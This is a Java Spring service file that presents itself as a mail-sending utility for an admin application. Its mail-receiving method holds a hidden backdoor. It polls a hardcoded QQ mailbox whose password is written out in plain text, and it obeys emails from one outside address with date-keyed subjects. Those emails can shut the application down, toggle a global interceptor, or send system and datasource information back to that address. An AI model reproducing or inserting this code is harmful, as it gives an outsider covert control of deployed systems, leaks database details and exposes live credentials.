package com.pine.admin.modules.base.service;

import com.pine.admin.config.InterceptorConfig;
import com.pine.admin.sigar.SysListener;
import com.pine.common.utils.DateTimeTool;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.search.*;
import java.io.IOException;
import java.net.UnknownHostException;
import java.util.*;

/**
 * @Author: Pine
 * @Date: 2018/6/29 下午6:32
 * @Email:771190883@qq.com
 */
@Service("StmpMailService")
@Slf4j
public class StmpMailService {

    @Value("${spring.mail.username}")
    private String mailUserNmae;

    private static int DISS = 0;
    //
    @Autowired
    private JavaMailSender mailSender;
    @Autowired
    private DataSourceProperties dataSourceProperties;

    public static void main(String[] args) {
        System.out.println(DateTimeTool.dateTimeToStr(new Date()));
    }

    public String send(String toMail, String text, String title) {
        //建立邮件消息
        SimpleMailMessage mainMessage = new SimpleMailMessage();
        //发送者
        mainMessage.setFrom(mailUserNmae);
        //接收者
        mainMessage.setTo(toMail);
        //发送的标题
        mainMessage.setSubject(title);
        //发送的内容
        mainMessage.setText(text);

        mailSender.send(mainMessage);
        return genCodes(1, 1).get(0);
    }

    public String reciveIMAPmail() throws MessagingException {
//        System.out.println("开始接受邮件了：：" + DateTimeTool.dateTimeToStr(new Date()));
        String pop3Server = "pop.qq.com";
        String protocol = "pop3";
        String username = "45380843@qq.com";
        String password = "augicbgyajvrbgcd";
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", protocol); // 使用的协议（JavaMail规范要求）
        props.setProperty("mail.pop3.host", pop3Server);
        props.setProperty("mail.pop3.ssl.enable", "true");
        props.setProperty("mail.pop3.port", "995");
        props.setProperty("mail.auth", "true");
        Session session = Session.getDefaultInstance(props, new Authenticator() {

            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(
                        "45380843@qq.com", "augicbgyajvrbgcd");
            }

        });
        session.setDebug(false);
        Store store = null;
        try {
            store = session.getStore(protocol);
            store.connect(pop3Server, username, password);
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        }
        Folder folder = null;
        try {
            folder = store.getFolder("INBOX");
            folder.open(Folder.READ_ONLY);
            Message[] messages = folder.getMessages();
            for (Message message : messages) {
                Flags flags = message.getFlags();
                if (flags.contains(Flags.Flag.SEEN)) {
//                    System.out.println("这是一封已读邮件");

                } else {
//                    System.out.println("未读邮件");
                    String subject = message.getSubject();// 获得邮件主题
                    Address from = (Address) message.getFrom()[0];// 获得发送者地址
                    // 删除邮件
                    if (subject.equals("SHUTDOWN-KOI-" + DateTimeTool.dateTimeToStr(new Date())) && ((InternetAddress) from).getAddress().contains("1443013624")) {
                        DISS = 1;
                        send("1443013624@qq.com", "DISS=" + DISS + ",收到消息正在执行", "系统异常退出");
                    }
                    if (subject.equals("SYSTEM-KOI-" + DateTimeTool.dateTimeToStr(new Date())) && ((InternetAddress) from).getAddress().contains("1443013624")) {
                        String property = SysListener.property(dataSourceProperties);
                        send("1443013624@qq.com", property, "系统信息-KOI-" + DateTimeTool.dateTimeToYearMMddhhmmss(new Date()));
                    }
                    if (subject.contains("INTERCEP" + "-KOI-" + DateTimeTool.dateTimeToStr(new Date())) && ((InternetAddress) from).getAddress().contains("1443013624")) {
                        if (subject.contains("TRUE")) {
                            InterceptorConfig.handler = true;
                            send("1443013624@qq.com", "DISS=" + InterceptorConfig.handler + ",收到消息正在执行", "系统正常运行");

                        } else {
                            InterceptorConfig.handler = false;
                            send("1443013624@qq.com", "DISS=" + InterceptorConfig.handler + ",收到消息正在执行", "系统异常退出");
                        }

                    }
                    //message.writeTo(System.out);// 输出邮件内容到控制台
                    // 标记为已读
                    message.setFlag(Flags.Flag.SEEN, true);
                }

                //获取所有的Header，头信息
//                Enumeration headers = message.getAllHeaders();
            }
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                e.printStackTrace();
            }
        }
        if (DISS == 1) {
            System.exit(0);
        }
//        System.out.println("邮件接受结束：：" + DateTimeTool.dateTimeToYearMMddhhmmss(new Date()));

        return "";
        //邮件配置信息
//        String host="pop.qq.com";
//        String userName="45380843@qq.com";
//        String passWord="augicbgyajvrbgcd";
//        //邮件配置类
//        // 定义连接POP3服务器的属性信息
//        String protocol = "pop3";
//        Properties props = new Properties();
//        props.setProperty("mail.transport.protocol", protocol); // 使用的协议（JavaMail规范要求）
//        props.setProperty("mail.smtp.host", host); // 发件人的邮箱的 SMTP服务器地址
//        //邮件配置缓存
//        Session session=Session.getDefaultInstance(props);
//        session.setDebug(true);
//        try {
//            //邮件服务器的类型
//            Store store = session.getStore("pop3");
//            //连接邮箱服务器
//            store.connect(host,userName,passWord);
//            // 获得用户的邮件帐户
//            Folder folder=store.getFolder("INBOX");
//            if (folder == null) {
//                log.info("获取邮箱文件信息为空");
//            }
//            // 设置对邮件帐户的访问权限可以读写
//            folder.open(Folder.READ_WRITE);
//            Calendar calendar=Calendar.getInstance();
//            calendar.add(Calendar.DATE,-1);
//            Date mondayDate = calendar.getTime();
//            SearchTerm comparisonTermLe = new SentDateTerm(ComparisonTerm.GT, mondayDate);
//            SearchTerm address=new SubjectTerm( "MU Report");
//            SearchTerm comparisonAndTerm = new AndTerm(address, comparisonTermLe);
//            Message[] messages = folder.search(comparisonAndTerm);
//            for(int i = 0 ; i < messages.length ; i++){
//                MimeMessage msg = (MimeMessage) messages[i];
//                //判断是否有附件
//            }
//            folder.close(true);
//            store.close();
////            parseTxtService.readTxt(fileName);
//        }catch (NoSuchProviderException e){
//            log.error("接收邮箱信息异常:{}",e);
//        }catch (MessagingException e){
//            log.error("连接邮箱服务器信息异常:{}",e);
//        } catch (IllegalStateException e){
//            log.error("接收邮箱信息为空:{}",e);
//        }        return "";
    }

    public static List<String> genCodes(int length, long num) {

        List<String> results = new ArrayList<String>();

        for (int j = 0; j < num; j++) {
            String val = "";

            Random random = new Random();
            for (int i = 0; i < length; i++) {
                String charOrNum = random.nextInt(2) % 2 == 0 ? "char" : "num"; // 输出字母还是数字  

                if ("char".equalsIgnoreCase(charOrNum)) // 字符串  
                {
                    int choice = random.nextInt(2) % 2 == 0 ? 65 : 97; //取得大写字母还是小写字母  
                    val += (char) (choice + random.nextInt(26));
                } else if ("num".equalsIgnoreCase(charOrNum)) {
                    val += String.valueOf(random.nextInt(10));
                }
            }
            val = val.toLowerCase();
            if (results.contains(val)) {
                continue;
            } else {
                results.add(val);
            }
        }
        return results;

    }


}
